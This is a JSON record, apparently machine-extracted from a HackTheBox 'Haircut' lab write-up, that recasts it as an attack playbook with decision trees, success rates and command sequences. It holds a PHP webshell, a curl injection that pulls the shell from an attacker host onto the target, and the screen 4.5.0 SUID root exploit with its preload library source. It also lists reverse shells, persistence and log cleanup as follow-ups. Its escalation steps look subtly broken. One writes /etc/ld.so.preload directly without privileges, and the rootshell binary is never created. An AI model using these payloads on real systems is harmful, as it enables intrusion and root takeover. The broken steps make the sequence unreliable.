@@ -1,0 +1,840 @@
+{
+  "writeup_id": "Htb_Haircut",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_curl_parameter_injection",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+nginx",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "curl_parameter_injection",
+    "privilege_path": "webshell_to_suid_escalation",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "php_curl_wrapper",
+      "file_upload_capability",
+      "suid_screen_binary",
+      "parameter_injection_vulnerability"
+    ],
+    "environmental_clues": [
+      "exposed_php_endpoint",
+      "uploads_directory_present",
+      "curl_output_displayed",
+      "character_filtering_implemented"
+    ],
+    "similar_scenarios": [
+      "bashed_htb_easy",
+      "networked_htb_easy"
+    ],
+    "unique_aspects": [
+      "curl_option_injection",
+      "screen_suid_exploit",
+      "nginx_ubuntu_stack"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Parameter Injection via curl",
+        "success_reason": "PHP application passed user input directly to curl command without proper sanitization",
+        "prerequisite_indicators": [
+          "web_application_available",
+          "curl_status_output_visible",
+          "user_input_processed_by_system_command"
+        ],
+        "recognition_patterns": [
+          "curl progress statistics in response",
+          "system command output formatting",
+          "URL parameter processing functionality"
+        ],
+        "failure_modes": [
+          "proper_input_sanitization",
+          "command_execution_restrictions",
+          "no_file_upload_capability"
+        ],
+        "environmental_factors": [
+          "php_system_function_enabled",
+          "writable_web_directory_exists",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Webshell Upload via curl -o",
+        "success_reason": "curl -o parameter allowed writing files to uploads directory with PHP execution",
+        "prerequisite_indicators": [
+          "parameter_injection_possible",
+          "writable_web_directory_accessible",
+          "php_execution_in_target_directory"
+        ],
+        "recognition_patterns": [
+          "uploads directory discovered",
+          "403 forbidden on directory listing",
+          "curl -o parameter injection successful"
+        ],
+        "failure_modes": [
+          "uploads_directory_not_writable",
+          "php_execution_disabled",
+          "file_extension_filtering"
+        ],
+        "environmental_factors": [
+          "default_nginx_php_configuration",
+          "permissive_file_upload_settings",
+          "no_file_type_restrictions"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "SUID Screen Privilege Escalation",
+        "success_reason": "Vulnerable version of screen binary with SUID permissions allowed root escalation",
+        "prerequisite_indicators": [
+          "suid_binaries_enumeration",
+          "screen_binary_with_suid",
+          "vulnerable_screen_version"
+        ],
+        "recognition_patterns": [
+          "screen binary in SUID enumeration",
+          "version 4.5.0 or similar vulnerable versions",
+          "exploit_available_for_version"
+        ],
+        "failure_modes": [
+          "screen_not_suid",
+          "patched_screen_version",
+          "exploit_mitigation_present"
+        ],
+        "environmental_factors": [
+          "ubuntu_16.04_default_packages",
+          "unpatched_system_binaries",
+          "standard_suid_configurations"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "5-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "curl parameter injection in exposed.php",
+        "discovery_method": "Manual testing of URL input field",
+        "why_critical": "Allowed arbitrary file upload and command execution",
+        "how_to_recognize": [
+          "curl progress statistics in HTTP response",
+          "system command output formatting",
+          "URL processing functionality"
+        ],
+        "follow_up_actions": [
+          "test_parameter_injection",
+          "identify_writable_directories",
+          "upload_webshell_via_curl_output"
+        ]
+      },
+      {
+        "discovery": "uploads directory with PHP execution",
+        "discovery_method": "Directory enumeration with gobuster",
+        "why_critical": "Provided location for webshell deployment",
+        "how_to_recognize": [
+          "403 forbidden on directory access",
+          "common upload directory naming",
+          "php execution enabled"
+        ],
+        "follow_up_actions": [
+          "test_file_upload_capability",
+          "verify_php_execution",
+          "deploy_webshell"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "SUID_screen_exploit",
+        "why_possible": "Screen binary had SUID permissions and vulnerable version",
+        "recognition_signs": [
+          "suid_enumeration_shows_screen",
+          "vulnerable_screen_version_identified",
+          "exploit_code_available"
+        ],
+        "exploitation_path": "SUID enumeration → Screen version check → Exploit execution → Root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and directory brute forcing",
+        "reasoning": "Limited attack surface requires thorough web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web attacks fail"
+          },
+          {
+            "option": "service_version_exploits",
+            "when": "if known vulnerabilities found"
+          }
+        ],
+        "success_indicators": [
+          "interesting_directories_found",
+          "php_files_discovered",
+          "file_upload_functionality"
+        ],
+        "next_decision": "analyze_web_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Found /exposed.php with URL input functionality showing curl-like output",
+        "decision": "Test for command injection and parameter injection vulnerabilities",
+        "reasoning": "Output format suggests backend curl execution vulnerable to injection",
+        "confidence": 0.85,
+        "prerequisites": [
+          "web_form_with_url_input",
+          "curl_output_patterns"
+        ],
+        "success_indicators": [
+          "filter_bypass_successful",
+          "command_execution_achieved"
+        ],
+        "failure_fallbacks": [
+          "parameter_injection",
+          "file_upload_via_curl_options"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Command injection blocked by character filters (;|&!#%[]{})",
+        "decision": "Try curl parameter injection with -o flag to upload webshell",
+        "reasoning": "Parameter injection bypasses command filters while achieving code execution",
+        "confidence": 0.8,
+        "prerequisites": [
+          "curl_parameter_injection_possible",
+          "writable_upload_directory"
+        ],
+        "success_indicators": [
+          "file_successfully_uploaded",
+          "php_execution_in_uploads"
+        ],
+        "failure_fallbacks": [
+          "alternative_injection_methods",
+          "filter_enumeration"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_parameter_injection_succeeds": {
+        "action": "upload_webshell_to_uploads_directory",
+        "tools": [
+          "curl",
+          "custom_php_webshell"
+        ],
+        "next_phase": "establish_reverse_shell"
+      },
+      "if_command_injection_available": {
+        "action": "use_command_substitution_bypass",
+        "alternatives": [
+          "$(command)",
+          "`command`"
+        ],
+        "decision_criteria": "based_on_filter_restrictions"
+      },
+      "if_webshell_uploaded": {
+        "action": "execute_reverse_shell_payload",
+        "purpose": "establish_persistent_access",
+        "tools": [
+          "nc",
+          "bash_reverse_shell"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_parameter_injection_on_curl_wrappers",
+        "reasoning": "curl_options_often_bypass_command_injection_filters",
+        "applicability": "web_apps_with_url_fetching_functionality"
+      },
+      {
+        "rule": "enumerate_character_filters_systematically",
+        "reasoning": "understanding_filters_enables_targeted_bypass_techniques",
+        "applicability": "input_validation_present"
+      },
+      {
+        "rule": "try_uploads_directory_for_webshell_placement",
+        "reasoning": "commonly_writable_and_web_accessible_location",
+        "applicability": "file_upload_or_write_capability_available"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_disabled",
+          "common_web_technologies"
+        ],
+        "success_indicators": [
+          "hidden_directories_found",
+          "admin_panels_discovered",
+          "backup_files_located"
+        ],
+        "incompatible_with": [
+          "aggressive_waf_protection",
+          "rate_limiting_strict",
+          "custom_404_handling"
+        ],
+        "confidence_boosters": [
+          "standard_web_frameworks",
+          "default_installations",
+          "php_extensions_present"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "5-20 minutes"
+      },
+      {
+        "technique": "Parameter Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "user_input_processing",
+          "system_command_execution",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "command_output_in_response",
+          "system_calls_successful",
+          "file_write_permissions"
+        ],
+        "incompatible_with": [
+          "strict_input_sanitization",
+          "command_execution_disabled",
+          "sandboxed_environment"
+        ],
+        "confidence_boosters": [
+          "curl_command_patterns",
+          "system_function_usage",
+          "minimal_filtering"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "SUID Binary Exploitation",
+        "mitre_id": "T1548.001",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "suid_binaries_present",
+          "vulnerable_binary_versions",
+          "local_access_obtained"
+        ],
+        "success_indicators": [
+          "suid_bit_set",
+          "known_vulnerable_version",
+          "exploit_code_available"
+        ],
+        "incompatible_with": [
+          "updated_system_binaries",
+          "restricted_file_permissions",
+          "selinux_enforcing"
+        ],
+        "confidence_boosters": [
+          "screen_binary_suid",
+          "legacy_system_versions",
+          "default_configurations"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "Web Shell Upload",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "web_writable_directory",
+          "script_execution_enabled"
+        ],
+        "success_indicators": [
+          "file_successfully_uploaded",
+          "script_execution_confirmed",
+          "command_output_received"
+        ],
+        "incompatible_with": [
+          "file_type_restrictions",
+          "upload_directory_not_executable",
+          "strict_file_permissions"
+        ],
+        "confidence_boosters": [
+          "uploads_directory_found",
+          "php_execution_enabled",
+          "minimal_file_validation"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "10-25 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "nginx",
+          "apache"
+        ],
+        "banner_indicators": [
+          "nginx",
+          "apache",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "OpenSSH"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "php",
+          ".php"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_functionality_and_admin_panels"
+        },
+        {
+          "attack": "parameter_injection",
+          "when": "user_input_forms_found",
+          "reason": "direct_command_execution_potential"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "web_shell_upload",
+          "when": "upload_directory_found",
+          "reason": "persistent_access_but_requires_writable_location"
+        },
+        {
+          "attack": "suid_exploitation",
+          "when": "local_access_obtained",
+          "reason": "privilege_escalation_after_initial_compromise"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Parameter Injection via curl",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "http://{target_ip}/exposed.php -d 'formurl={payload}&submit=go'",
+            "actual_command": "curl http://10.10.10.24/exposed.php -d 'formurl=http://10.10.14.15/cmd.php -o uploads/0xdf.php&submit=go'",
+            "output_pattern": "curl status messages with injected parameters",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "web_application_using_curl_backend",
+          "insufficient_input_validation",
+          "writable_upload_directory"
+        ],
+        "success_indicators": [
+          "curl_options_accepted",
+          "file_successfully_uploaded",
+          "webshell_accessible_via_http"
+        ],
+        "common_failures": [
+          "character_filtering_blocks_injection",
+          "upload_directory_not_writable",
+          "uploaded_files_not_executable"
+        ],
+        "follow_up_techniques": [
+          "webshell_execution",
+          "reverse_shell_establishment",
+          "local_privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Command Injection via Backticks",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl {target}/exposed.php --data-urlencode 'formurl={target_ip}/$(command)' --data-urlencode 'submit=go'",
+            "actual_command": "curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(ping -c 1 10.10.14.15)' --data-urlencode 'submit=go'",
+            "output_pattern": "command execution within curl parameter",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "command_substitution_not_filtered",
+          "backend_system_calls_vulnerable",
+          "network_connectivity_for_callbacks"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "network_callbacks_received",
+          "file_operations_successful"
+        ],
+        "common_failures": [
+          "backticks_filtered",
+          "network_restrictions",
+          "command_output_not_visible"
+        ],
+        "follow_up_techniques": [
+          "file_upload_via_wget_curl",
+          "reverse_shell_execution",
+          "persistence_establishment"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Screen 4.5.0 SUID Privilege Escalation",
+        "mitre_id": "T1068",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "gcc",
+            "command_template": "gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c",
+            "actual_command": "gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c",
+            "output_pattern": "shared library compilation successful",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "screen",
+            "command_template": "/usr/bin/screen-4.5.0 -D -m -L {logfile}",
+            "actual_command": "/usr/bin/screen-4.5.0 -D -m -L /etc/ld.so.preload",
+            "output_pattern": "screen session with log file creation",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "screen_4.5.0_suid_binary_present",
+          "gcc_compiler_available",
+          "write_access_to_tmp_directory"
+        ],
+        "success_indicators": [
+          "libhax.so_compiled_successfully",
+          "rootshell_binary_created",
+          "ld.so.preload_file_created",
+          "root_shell_obtained"
+        ],
+        "common_failures": [
+          "gcc_not_available",
+          "screen_version_not_vulnerable",
+          "insufficient_file_permissions"
+        ],
+        "follow_up_techniques": [
+          "root_flag_collection",
+          "persistence_mechanisms",
+          "log_cleanup"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "wfuzz"
+        ],
+        "best_practices": [
+          "include_common_extensions_like_php",
+          "use_multiple_wordlists_for_coverage",
+          "adjust_thread_count_based_on_target_stability"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "parameter_injection_testing",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_exploitation"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "wget",
+          "python_requests"
+        ],
+        "best_practices": [
+          "use_data_urlencode_for_special_characters",
+          "test_various_injection_points",
+          "monitor_network_traffic_for_callbacks"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "curl_parameter_injection_to_webshell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > cmd.php",
+            "purpose": "Create simple webshell payload",
+            "expected_output": "Webshell file created locally"
+          },
+          {
+            "step": 2,
+            "command": "python3 -m http.server 80",
+            "purpose": "Start local web server to host payload",
+            "expected_output": "HTTP server listening on port 80"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.10.24/exposed.php -d 'formurl=http://10.10.14.15/cmd.php -o uploads/shell.php&submit=go'",
+            "purpose": "Inject curl -o parameter to upload webshell",
+            "expected_output": "File uploaded to target uploads directory"
+          },
+          {
+            "step": 4,
+            "command": "curl http://10.10.10.24/uploads/shell.php?cmd=id",
+            "purpose": "Test webshell execution",
+            "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "screen_suid_privilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "find / -perm -4000 -type f 2>/dev/null | grep screen",
+            "purpose": "Identify SUID screen binary",
+            "expected_output": "/usr/bin/screen-4.5.0"
+          },
+          {
+            "step": 2,
+            "command": "cat > /tmp/libhax.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n__attribute__ ((__constructor__))\nvoid dropshell(void){\n    chown(\"/tmp/rootshell\", 0, 0);\n    chmod(\"/tmp/rootshell\", 04755);\n    unlink(\"/etc/ld.so.preload\");\n}\nEOF",
+            "purpose": "Create malicious shared library source",
+            "expected_output": "Source file created in /tmp"
+          },
+          {
+            "step": 3,
+            "command": "gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c",
+            "purpose": "Compile shared library",
+            "expected_output": "Shared library compiled successfully"
+          },
+          {
+            "step": 4,
+            "command": "echo \"/tmp/libhax.so\" > /etc/ld.so.preload",
+            "purpose": "Set library preload via screen log functionality",
+            "expected_output": "Preload configuration written"
+          },
+          {
+            "step": 5,
+            "command": "/usr/bin/screen-4.5.0 -D -m -L /etc/ld.so.preload",
+            "purpose": "Trigger screen vulnerability",
+            "expected_output": "Screen session started, privilege escalation triggered"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Haircut",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu 16.04",
+      "platform": "HackTheBox",
+      "release_date": "2017-05-26",
+      "author": "r00tkie",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "parameter_injection",
+        "suid_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "curl_parameter_injection",
+        "suid_screen_vulnerability",
+        "webshell_upload"
+      ],
+      "environment_type": "linux_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "parameter_injection",
+        "webshell_techniques",
+        "suid_exploitation",
+        "screen_vulnerability"
+      ],
+      "prerequisite_knowledge": [
+        "web_enumeration",
+        "php_basics",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "parameter_injection",
+        "privilege_escalation",
+        "suid_exploitation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "command_execution"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "suid_binary_auditing",
+        "web_application_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bashed",
+        "Nineveh",
+        "Shocker"
+      ],
+      "similarity_reasons": [
+        "web_to_shell",
+        "parameter_injection",
+        "linux_privesc"
+      ],
+      "unique_aspects": [
+        "curl_parameter_injection",
+        "screen_suid_exploit",
+        "php_filter_bypass"
+      ],
+      "difficulty_factors": [
+        "filter_evasion",
+        "suid_exploitation_knowledge",
+        "parameter_injection_techniques"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T19:17:42.461970",
+    "original_file": "0xdf_writeups/Htb Haircut.md",
+    "content_length": 21911,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
